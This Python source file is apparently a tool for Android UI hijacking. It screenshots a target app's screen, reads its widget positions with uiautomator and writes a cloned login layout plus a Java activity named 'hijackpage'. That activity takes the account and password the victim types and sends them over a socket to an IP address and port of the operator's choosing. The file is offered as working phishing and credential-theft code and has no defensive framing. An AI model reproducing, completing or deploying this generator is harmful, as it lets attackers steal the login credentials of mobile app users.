import subprocess
import os
from PIL import Image
from uiautomator import device as d

# original image path
IMAGE_PATH = ""
# cropped image path
IMAGE_PATH1 = ""

APP_NAME = "app name"
IMAGE_NAME = "a.png"
FILE_NAME = APP_NAME + ".xml"
FIGURE_PATH = "figure path"
FILE_PATH_JAVA = "file path"
FILE_NAME_JAVA = "file name.java"
FILE_PATH_XML = "file path"
FILE_NAME_XML = "file name.xml"

CHANGE_NUM = 0
lista = {}
WIDGET_LIST = []
INDEX = []
STATUS_BAR_HEIGHT = 63

XML_FILE_NAME = "sample.xml"
XML_LAYOUT_FILENAME = "sample"
XML_EDITTEXT_NAME_1 = "editText0"
XML_EDITTEXT_NAME_2 = "editText1"
XML_BUTTON_NAME = "Button0"
XML_ACTIVITY_ID = "activity1"
XML_LAYOUT_BACKGROUND = "eeeeee"

PACKAGE_NAME = "package 'here is the package name of your app';\n"
IMPORT_CLASS = "\nimport android.os.Bundle;\n" + "import android.os.StrictMode;\n" + "import android.util.Log;\n" + "import android.view.View;\n" + "import android.view.Window;\n" + \
               "import android.widget.Button;\n" + "import android.widget.EditText;\n" + '\n' + "import androidx.appcompat.app.AppCompatActivity;\n" + "import androidx.constraintlayout.widget.ConstraintLayout;\n" + \
               "\n" + "import java.io.BufferedWriter;\n" + "import java.io.DataInputStream;\n" + "import java.io.FileOutputStream;\n" + "import java.io.OutputStreamWriter;\n" + "import java.io.PrintWriter;\n" + \
               "import java.net.InetAddress;\n" + "import java.net.Socket;\n" + "import java.net.UnknownHostException;\n" + "\n"
CLASS_FRAMEWORK_CODE = "public class hijackpage extends AppCompatActivity {\n" + "    public EditText EditText0 = null;\n" + "    public EditText EditText1 = null;\n" + "    public android.widget.Button Button = null;\n" + \
                       "\n" + "    protected void onCreate(Bundle hello) {\n" + "        super.onCreate(hello);\n" + "        requestWindowFeature(Window.FEATURE_NO_TITLE);\n" + "        setContentView(R.layout." + XML_LAYOUT_FILENAME + ");\n" + \
                       "\n" + "        if (getSupportActionBar() != null){\n" + "            getSupportActionBar().hide();\n" + "        }\n" + "\n" + "        if (android.os.Build.VERSION.SDK_INT > 9) {\n" + \
                       "            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();\n" + "            StrictMode.setThreadPolicy(policy);\n" + "        }\n" + "\n" + \
                       "        " + "        ConstraintLayout constraintLayout = findViewById(R.id.activity11);\n" + "        constraintLayout.setBackgroundResource(R.drawable.eeeeee);\n" + "\n" + \
                       "        " + "        EditText0 = findViewById(R.id." + XML_EDITTEXT_NAME_1 + ");\n" + "        EditText1 = findViewById(R.id." + XML_EDITTEXT_NAME_2 + ");\n" + \
                       "        Button = findViewById(R.id." + XML_BUTTON_NAME + ");\n" + "        Button.setOnClickListener(new View.OnClickListener(){\n" + "            @Override\n" + "            public void onClick(View v) {\n" + \
                       "                String text0 = EditText0.getText().toString();\n" + "                String text1 = EditText1.getText().toString();\n" + "\n" + "                Socket socket = null;\n" + "                try {\n" + \
                       "                    " + "                    InetAddress serverAddr = InetAddress.getByName(\" 'here is your ip address' \");" + \
                       "                    Log.d(\"TCP\", \"C: Connecting...\");\n" + "\n" + "                    socket = new Socket(serverAddr, 'here is the set port');\n" + \
                       "                    String message = \"---Test_Socket_Android---\";\n" + "\n" + "                    Log.d(\"TCP\", \"C: Sending: \'\" + message + \"\'\");\n" + "\n" + \
                       "                    PrintWriter out = new PrintWriter(new BufferedWriter(\n" + "                            new OutputStreamWriter(socket.getOutputStream())),\n" + "                               true);\n" + "\n" + \
                       "                    " + "                    String toServer = \"ACCOUNT : \" + text0 + \"PASSWORD : \" + text1;\n" + "                    out.println(toServer);\n" + \
                       "                    out.flush();\n" + "\n" + "                } catch(UnknownHostException e) {\n" + "                } catch(Exception e) {\n" + "                    e.printStackTrace();\n" + \
                       "                } finally {\n" + "                    try {\n" + "                        socket.close();\n" + "                    } catch(Exception e) {\n" + "                        e.printStackTrace();\n" + \
                       "                    }\n" + "                }\n" + "            }\n" + "        });\n" + "    }\n" + "}\n"


WIDGET_ID = ['EditText1']

HEADER = "<?xml version='1.0' encoding='utf-8'?>\n<androidx.constraintlayout.widget.ConstraintLayout xmlns:android='http://schemas.android.com/apk/res/android'\n" \
         "    xmlns:app='http://schemas.android.com/apk/res-auto'\n    xmlns:tools='http://schemas.android.com/tools'\n    android:layout_width='match_parent'\n" \
         "    android:layout_height='match_parent'\n    android:backgroundTintMode='screen'\n    android:id='@+id/activity11'\n    tools:context='.MainActivity'>\n\n\n"
FOOTER = "\n</androidx.constraintlayout.widget.ConstraintLayout>"


def widget_info(str,index):
    return d(className=str)[index].info

def get_widgetlist():
    nums = d(className='android.widget.EditText').count
    ordinal = 0
    while (ordinal != nums):
        WIDGET_LIST.append("android.widget.EditText")
        INDEX.append(ordinal)
        ordinal = ordinal + 1
    WIDGET_LIST.append('android.widget.Button')
    INDEX.append(0)
    WIDGET_LIST.append("android.widget.TextView")
    INDEX.append(0)

def info_extract(**dict):
    widget_information = {}
    widget_information['widget_legnth'] = dict.get('bounds')['right'] - dict.get('bounds')['left']
    widget_information['widget_width'] = dict.get('bounds')['bottom'] - dict.get('bounds')['top']
    widget_information['text'] = str(dict.get('text'))
    widget_information['packageName'] = dict.get('packageName')
    widget_information['className'] = dict.get('className')
    widget_information['bottom'] = dict.get('bounds')['bottom'] - STATUS_BAR_HEIGHT
    widget_information['top'] = dict.get('bounds')['top'] - STATUS_BAR_HEIGHT
    widget_information['left'] = dict.get('bounds')['left']
    widget_information['right'] = dict.get('bounds')['right']
    return widget_information

def get_background():
    d.screenshot("sdcard/screen_shot.png")
    subprocess.getoutput("adb pull sdcard/screen_shot.png" + FIGURE_PATH)

def folder_maker_java(path):
    if os.path.exists(path) != True:
        os.makedirs(path)

def file_maker_java():
    folder_maker_java(FILE_PATH_JAVA)
    with open(FILE_PATH_JAVA + FILE_NAME_JAVA, 'w+',encoding='utf-8') as f:
        print(PACKAGE_NAME + IMPORT_CLASS + CLASS_FRAMEWORK_CODE)
        f.writelines(PACKAGE_NAME + IMPORT_CLASS + CLASS_FRAMEWORK_CODE)
    f.close()

def folder_maker(path):
    if os.path.exists(path) != True:
        os.makedirs(path)

def dict_info_extract(index,**dict):
    if dict.get('className') == 'android.widget.EditText':
        body = "    <EditText\n        android:id='@+id/editText" + str(index) + "'\n        android:layout_width='" + str(
            dict.get('widget_legnth')) + "px'\n        android:layout_height='" + str(
            dict.get('widget_width') - 8) + "px'\n        android:ems='10'\n        android:layout_marginLeft='" + str(
            dict.get('left')) + "px'\n        android:layout_marginTop='" + str(
            dict.get('top')) + "px'\n        android:inputType='textPersonName'\n        android:hint='" + str(
            dict.get(
                'text')) + "'\n        app:layout_constraintStart_toStartOf='parent'\n        app:layout_constraintTop_toTopOf='parent'\n        android:textSize='18dip'\n        android:background='@drawable/edittext' />\n"
        return body
    if dict.get('className') == 'android.view.View':
        body = "    <EditText\n        android:id='@+id/editText" + str(index) + "'\n        android:layout_width='" + str(
            dict.get('widget_legnth')) + "px'\n        android:layout_height='" + str(
            dict.get('widget_width') - 8) + "px'\n        android:ems='10'\n        android:layout_marginLeft='" + str(
            dict.get('left')) + "px'\n        android:layout_marginTop='" + str(
            dict.get('top')) + "px'\n        android:inputType='textPersonName'\n        android:hint='" + str(
            dict.get(
                'text')) + "'\n        app:layout_constraintStart_toStartOf='parent'\n        app:layout_constraintTop_toTopOf='parent'\n        android:textSize='18dip'\n        android:background='@drawable/edittext' />\n"
        return body
    if dict.get('className') == 'android.widget.Button':
        body = "    <Button\n        android:id='@+id/Button" + str(index) + "'\n        android:layout_width='" + str(
            dict.get('widget_legnth')) + "px'\n        android:layout_height='" + str(
            dict.get('widget_width')) + "px'\n        android:ems='10'\n        android:layout_marginLeft='" + str(
            dict.get('left')) + "px'\n        android:layout_marginTop='" + str(
            dict.get('top')) + "px'\n        android:inputType='textPassword'\n        app:layout_constraintStart_toStartOf='parent'\n        app:layout_constraintTop_toTopOf='parent'\n        android:background='#00000000' />\n"
        return body
    if dict.get('className') == 'android.widget.TextView':
        body = "    <Button\n        android:id='@+id/Button" + str(index) + "'\n        android:layout_width='" + str(
            dict.get('widget_legnth')) + "px'\n        android:layout_height='" + str(
            dict.get('widget_width')) + "px'\n        android:ems='10'\n        android:layout_marginLeft='" + str(
            dict.get('left')) + "px'\n        android:layout_marginTop='" + str(
            dict.get('top')) + "px'\n        android:inputType='textPassword'\n        app:layout_constraintStart_toStartOf='parent'\n        app:layout_constraintTop_toTopOf='parent'\n        android:background='#00000000' />\n"
        return body

def file_maker(FILE_NAME_XML):
    folder_maker(FILE_PATH_XML)
    with open(FILE_PATH_XML + FILE_NAME_XML, 'w+',encoding='utf-8') as f:
        f.writelines(HEADER)
        num = 0
        for key in WIDGET_LIST:
            body = dict_info_extract(INDEX[num],**info_extract(**widget_info(key,INDEX[num])))
            num = num + 1
            f.writelines(body)
        f.writelines(FOOTER)
    f.close()

def get_background():
    global CHANGE_NUM
    CHANGE_NUM = 1
    d.screenshot("the path you want to save" + APP_NAME + "the file you want to save, such as 'a.png'.")

def image_cropping():
    img = Image.open(IMAGE_PATH)
    img_cropped = img.crop((0,95,img.size[0],img.size[1]))
    img_cropped.save(IMAGE_PATH1 + IMAGE_NAME)

if __name__ == '__main__':
    get_background()
    image_cropping()
    get_widgetlist()
    file_maker(FILE_NAME)
    file_maker_java()
    get_background()